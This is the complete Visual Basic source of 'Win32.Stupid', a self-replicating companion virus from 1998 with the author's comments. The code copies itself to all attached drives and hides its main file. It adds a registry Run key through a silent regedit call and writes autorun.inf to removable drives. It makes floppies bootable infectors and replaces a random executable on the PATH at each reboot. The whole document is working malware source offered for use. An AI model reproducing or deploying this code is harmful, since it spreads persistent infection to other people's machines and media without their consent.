   '------------------------------'------------------------------
   ' Win32.Stupid
   '    by VicodinES
   '        First virus ever written in VB5
   '            First VB virus ever (I think)
   '
   '------------------------------'------------------------------
   '
   ' Companion Virus - EXE infection
   '
   ' What does it do?
   '
   '   Copies itself to all available resources on initial execution
   '       (removable drives and floppy included)
   '   Registers itself as a "RUN" service in the registry
   '       (activated during each reboot)
   '   Has a small message box payload.
   '   Makes infected floppys "bootable infectors"
   '   Makes infected zip drives "carriers" (with an autorun.inf)
   '   Slow infector
   '       (only does one EXE per reboot othewise it might be too obvious)
   '   Works on Win95/98/NT
   '
   ' Drawbacks:
   '
   '   It's a companion virus
   '   DLL dependent in 95/NT (Win98 ships with the dll)
   '   it's too big
   '
   '------------------------------'------------------------------
   '
   '   I tried to comment the best I could - I am a SLOPPY PROGRAMMER so if you don't
   '   understand something or start to go nuts because I don't indent then just ask
   '   me for an explanatioin - Vic
   '
   '------------------------------'------------------------------
   '
   ' (c) The Narkotic Network, July 1998
   '
   '------------------------------'------------------------------
   '
   ' **THIS IS THE 2nd VERSION - A FEW BUG FIXES A FEW CHANGES**
   '------------------------------'------------------------------

   ' Declare API's

   Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Private Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
   Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
   Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
   Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long

   ' Declare Variables and such...

   Private FD(1 To 10) As String
   Private xc, x As Integer
   Private Smilecopy, Dat0copy, smile, dat0, weare, wearecom, supspn, sup As String
   Private companion, nodat0 As Boolean
   Private s As Long
   Private Sub Form_Load()

   ' Handle Errors

   On Error Resume Next

   ' Need for REG - API calls

   Const REG_DWORD As Long = 4
   Const REG_SZ As Long = 1
   Const HKEY_CURRENT_USER As Long = &H80000001
   Const HKEY_LOCAL_MACHINE As Long = &H80000002

   ' Check To See If The Payload Goes Off Now

   Call PassCheck

   ' Some Local Variables

   Dim s As Long
   s = 256
   v$ = String$(s, 0)      ' Fill v$ with 256 chars of "0"
   weare = App.EXEName     ' The name of the EXE that was just executed
   wearecom = weare & ".com"   ' The name of the EXE if it was .com (companion name)
   smile = weare & ".exe"      ' The full name of the EXE (+.exe)
   dat0 = "dat0.exe"           ' The name of our main file (dat0.exe)
   dat0home = "c:\" & dat0     ' Our main file with path (c:\)
   HoldMeDear = Dir(wearecom)  ' A dir check to see if there is already a companion file

   ' Check the REG for the Win95 Startup Dir
   ' we will use this info later in our code

   u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", 0, KEY_ALL_ACCESS, k)
   u = RegQueryValueExA(k, "Startup", 0, REG_SZ, ByVal v$, s)
   u = RegCloseKey(k)
   For e = 1 To Len(v$)
       If Mid$(v$, e, 1) = Chr$(0) Then GoTo done
       sup = sup + Mid$(v$, e, 1)
   Next e
   done:

   ' take the Directory found and get the short path name from it

   supspn = spn(sup)

   ' if there was a *.com file then set companion to true

   If (UCase(HoldMeDear)) = (UCase(wearecom)) Then companion = True

   ' Check the REG for our RUN value

   u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, k)
   u = RegQueryValueExA(k, "Vic", 0, REG_SZ, ByVal v$, s)
   u = RegCloseKey(k)
   If Mid$(v$, 5, 1) <> "d" Then
       Call makereg
   Else
       wein = True
   End If

   ' Make dat0.exe visable

   SetAttr dat0home, vbArchive

   ' See if dat0.exe exists

   If Dir(dat0home) <> dat0 Then nodat0 = True

   ' Set dat0.exe hidden again

   SetAttr dat0home, vbHidden + vbReadOnly + vbSystem

   ' If there was a dat0.exe and we are dat0.exe (just executed) then run virus code

   If (nodat0 = False) And UCase(weare) = "DAT0" Then Call WeVirus

   ' If there was a dat0.exe and a companion was found then execute the file
   ' (pass control to the file and quit)

   If nodat0 = False And companion = True Then Call ExecuteFile

   ' If we didn't jump out of code yet them we are acting as a "worm"
   ' First thing to do is find all the drives attaced to this computer

   Call Find_Drives

   ' Copy ourself to all attaced drives
   ' We copy ourself as Smile.exe just in case someone finds us
   ' on a network drive and wonders what smile.exe does :)

   For x = 1 To xc
   Smilecopy = FD(x) & "Smile.exe"
   Dat0copy = FD(x) & dat0
   typeofdrive = GetDriveType(CStr(FD(x)))
   If typeofdrive = 5 or typeofdrive = 4 Or typeofdrive = 3 Or typeofdrive = 2 Or typeofdrive = 1 Then
   If typeofdrive = 2 And UCase(FD(x)) <> "A:\" Then Call ARD  ' Check to see if we are about to
                                           ' copy to a removable drive but not
                                           ' drive a:  -- if so we want to make
                                           ' a autorun.inf
   If UCase(FD(x)) = "A:\" Then    ' if the drive is a: then
   Call ADrive             ' jump to a: specific code
   GoTo adone:             ' - jump out of this part of the loop
   End If

   If Dir(Smilecopy) <> "Smile.exe" Or nodat0 = True Then          ' if we didn't find dat0.exe on c:
   If (UCase(FD(x)) = "C:\") And (wein = False Or nodat0 = True) Then  ' then we make one and copy smile.exe
   FileCopy smile, Dat0copy                                ' to c: also
   nodat0 = False
   FileCopy smile, Smilecopy
   SetAttr Dat0copy, vbHidden + vbReadOnly + vbSystem  ' set dat0.exe hidden and system
   Else                                    ' to help us hide
   FileCopy smile, Smilecopy
   End If
   End If
   adone:
   End If
   Next x
   End
   End Sub

   ' Here we find all drives attached to the machine
   ' we are looking only for removable (type 2), no root (type 1),
   ' remote (type 4) and fixed drives (type 3)
   ' NOT cd roms (type 5), unknown (type 0) or ram disk (type 6)

   Function Find_Drives()
   Dim strBuffer As String
   Dim lngBytes As Long
   Dim intPos As Integer
   Dim intPos2 As Integer
   Dim strDrive As String
   strBuffer = Space(255)
   lngBytes = GetLogicalDriveStrings(Len(strBuffer), strBuffer)
   intPos2 = 1
   intPos = InStr(intPos2, strBuffer, vbNullChar)
   Do Until intPos = 0 Or intPos > lngBytes
   xc = xc + 1
   strDrive = Mid(strBuffer, intPos2, intPos - intPos2)
   FD(xc) = strDrive
   intPos2 = intPos + 1
   intPos = InStr(intPos2, strBuffer, Chr(0))
   Loop
   End Function

   ' Simple way to enter our RUN service in the reg
   ' shell it out to regedit /s
   ' /s is "silent" so the user sees no msg box

   Function makereg()
   On Error Resume Next
   Open "c:\v.reg" For Output As 1
   Print #1, "REGEDIT4"
   Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]"
   Print #1, """Vic""=""\""c:\\dat0.exe\"""""
   Close 1
   Shell "regedit /s c:\v.reg"
   Kill "c:\v.reg"
   End Function

   ' If we are copying to the a: drive and we find a disk in the a:
   ' then lets create a autoexec.bat and sys the drive so it's like
   ' a bootable infector.
   ' We get the windows start dir from the reg

   Function ADrive()
   On Error GoTo out   ' as soon as we get an error get out - no need to make the a: flash more than necessary
   If Dir(Smilecopy) <> "Smile.exe" Then
   FileCopy smile, Smilecopy
   Open "a:\autoexec.bat" For Output As 1
   Print #1, "@echo off"
   Print #1, "copy smile.exe " & supspn & "\smile.exe"
   Print #1, "cls"
   Print #1, "del autoexec.bat"
   Close 1
   Open "c:\s.bat" For Output As 1
   Print #1, "path=c:\windows\command"
   Print #1, "c:"
   Print #1, "sys a:"
   Close 1
   Shell "c:\s.bat", vbHide
   End If
   out:
   End Function

   ' If we found a companion then execute the file and quite our virus
   ' we get the name from our name (app.EXEName) and just execute the
   ' .com equivilant

   Function ExecuteFile()
   On Error Resume Next
   Shell (wearecom), vbNormalNoFocus
   End
   End Function

   ' Begin our "virus" code

   Function WeVirus()
   On Error Resume Next
   Dim pathz(1 To 20), infect(1 To 100) As String
   Dim dispick As String
   Dim EXEFile As Integer

   If Dir("c:\p.d") <> "p.d" Then  ' if our path file does not exist then
   Open "pth.bat" For Output As 1  ' we need to make it
   Print #1, "path > c:\p.d"       ' c:\p.d is just the path command captured to
   Close 1                 ' a text file so we can get some paths
   Shell "pth.bat", vbHide         ' to infect
   For x = 1 To 1000000        ' delay so the computer catches up
   Next x              ' then we can get our paths
   End If
   ctr = 1

   Open "c:\p.d" For Input Access Read Shared As 1 ' open our path file
   Do Until EOF(1)
   snap = Input(1, 1)
   If UCase(snapit) = "PATH=" Then snapit = "" ' remove the statement "PATH="
   If snap <> ";" Then snapit = snapit + snap  ' keep working till we get to ";"
   If snap = ";" Then                  ' if we get a ";" then put that
   pathz(ctr) = snapit                 ' path into an array for use later
   snapit = ""
   ctr = ctr + 1
   End If
   Loop
   Close 1
   Randomize

   dispick = pathz(Int(Rnd * (ctr - 1)) + 1)       ' pick a random path to infect (from our array)
   pathtoinfect = spn(dispick)             ' get the windows short path name for

   InfectEXEName = Dir(pathtoinfect & "\*.exe", vbDirectory)   ' begin to find all *.exe files in that path
   Do While InfectEXEName <> ""
   EXEFile = EXEFile + 1
   infect(EXEFile) = InfectEXEName
   InfectEXEName = Dir
   Loop

   ' once we have all our exe's we want to just pick one
   ' I just pick a random one

   pickedexe = infect((Int(Rnd * (EXEFile - 1))) + 1)
   rawEXEName = Mid(pickedexe, 1, Len(pickedexe) - 4)  ' remove the ".exe" from the file we want to infect
   If Dir(dispick & "\" & rawEXEName & ".com") <> rawEXEName & ".com" Then ' see if a companion already exists

   ' if no companion exists then copy the file as a .com
   ' and copy ourself into it's place (companion infection)

   FileCopy pathtoinfect & "\" & pickedexe, pathtoinfect & "\" & rawEXEName & ".com"
   FileCopy smile, pathtoinfect & "\" & pickedexe
   Else
   End If
   End Function

   ' The short path name function
   ' the makes everything easier to code because it converts
   ' stuff like c:\program files to c:\progra~1

   Function spn(sp As String) As String
   Dim sb As String
   Dim lb As Long
   sb = Space(200)
   lb = GetShortPathName(sp, sb, Len(sb))
   If lb > 0 Then spn = Left(sb, lb)
   End Function

   ' See if we are going to run our msg box payload

   Function PassCheck()
   If Minute(Now) = 30 And Second(Now) >= 16 Then
   If Day(Now) > 15 Then
   MsgBox "DAMN!!" + vbCr + "This is..." + vbCr + "*S T U P I D*", vbExclamation, "Win32.Stupid"
   Else
   well = MsgBox("Cameron Diaz is a goddess!", vbExclamation + vbYesNo, "Vic says...")
   If well = vbYes Then
   End
   Else
   MsgBox "JERK!", vbApplicationModal + vbCritical, "Win32.Stupid"
   End If
   End If
   End If
   End Function

   ' For the removable drives this is where we write out the autorun.inf

   Function ARD()
   If Dir("Autorun.inf") <> "Autorun.inf" Then
   Open FD(x) & "Autorun.inf" For Output As 1
   Print #1, "[autorun]"
   Print #1, "OPEN=SMILE.EXE"  ' if someone were to doubleclick on an infected removable drive
   Close 1             ' it would run our virus :)
   End If
   End Function
